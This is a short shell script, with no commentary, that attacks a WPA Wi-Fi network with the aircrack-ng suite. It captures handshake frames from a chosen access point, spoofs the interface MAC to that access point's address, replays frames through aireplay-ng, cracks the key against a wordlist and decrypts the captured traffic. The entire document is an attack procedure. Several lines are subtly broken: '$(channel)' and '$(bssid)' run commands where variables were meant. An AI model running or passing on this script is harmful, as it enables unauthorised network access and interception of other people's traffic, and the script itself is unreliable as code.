airmon-ng check kill
iw dev hotspot del
rfkill unblock wlan
airmon-ng start wlp2s0
airodump-ng -a wlp2s0mon
printf "Enter the BSSID of the AP : "
read bssid
printf "Enter the channel to listen to : "
read channel
airodump-ng -a --write capture -c $(channel) --bssid $(bssid) wlp2s0mon
tshark -r capture-02.cap -R "(wlan.fc.type_subtype == 0x08 || eapol)" -2 -w filtered.cap -F pcap
ip link set wlp2s0mon down
macchanger -m $(bssid)
ip link set wlp2s0mon up
aireplay-ng -r filtered.cap -2 -h D4:67:D3:52:70:E9 wlp2s0mon
aircrack-ng -w wordlist capture-02.cap
cat >key
sed "s/ /:/g" key -i
sed "2s/[^0-9A-Z]://g" key -i
sed "2s/^://" key -i
sed "N;s/\n//" key -i
airdecap-ng -k `cat key` capture-02.cap
airmon-ng stop wlp2s0mon
